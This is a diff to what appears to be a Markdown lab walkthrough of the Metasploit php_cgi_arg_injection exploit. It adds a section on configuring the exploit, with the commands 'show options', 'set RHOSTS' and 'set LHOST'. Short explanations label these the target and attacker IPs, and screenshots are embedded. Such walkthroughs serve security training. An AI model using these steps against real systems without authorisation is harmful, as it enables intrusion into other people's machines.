@@ -86,8 +86,22 @@ use exploit/multi/http/php_cgi_arg_injection
   <img width="940" height="534" alt="image" src="https://github.com/user-attachments/assets/8cfb52b6-5b70-4d42-b05f-7780235e2d70" />
 </p>
 
+## 5. Configuring Exploit Options
 
+### 🔍 Command Used
 
+show options  
+set RHOSTS <target-ip>  
+set LHOST <your-ip>  
+
+### 📌 Explanation
+
+- `RHOSTS` → Target machine IP  
+- `LHOST` → Attacker machine IP  
+
+<p align="center">
+  <img width="940" height="592" alt="image" src="https://github.com/user-attachments/assets/d3a23cb8-a225-40c0-b590-65e2a754c47e" />
+</p>
 
 
 
